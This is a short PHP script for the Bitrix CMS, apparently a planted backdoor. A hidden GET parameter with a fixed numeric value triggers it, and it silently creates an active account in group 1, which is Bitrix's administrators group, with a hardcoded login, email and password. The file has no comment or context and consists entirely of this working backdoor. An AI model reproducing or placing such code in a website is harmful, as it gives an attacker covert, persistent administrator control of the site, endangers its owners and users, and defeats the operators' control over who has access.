<?
if(isset($_GET['pwdr']) && intval($_GET['pwdr'])===98765)
{
    require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
    $user = new CUser;
    $arFields = Array(
        "NAME"              => "Сергей",
        "LAST_NAME"         => "Иванов",
        "EMAIL"             => "ivanov@ia.com",
        "LOGIN"             => "ivan987654321",
        "LID"               => "ru",
        "ACTIVE"            => "Y",
        "GROUP_ID"          => array(1),
        "PASSWORD"          => "=Cxz987654321",
        "CONFIRM_PASSWORD"  => "=Cxz987654321",
        "LID"=>SITE_ID
    );
    $ID = $user->Add($arFields);
}
?>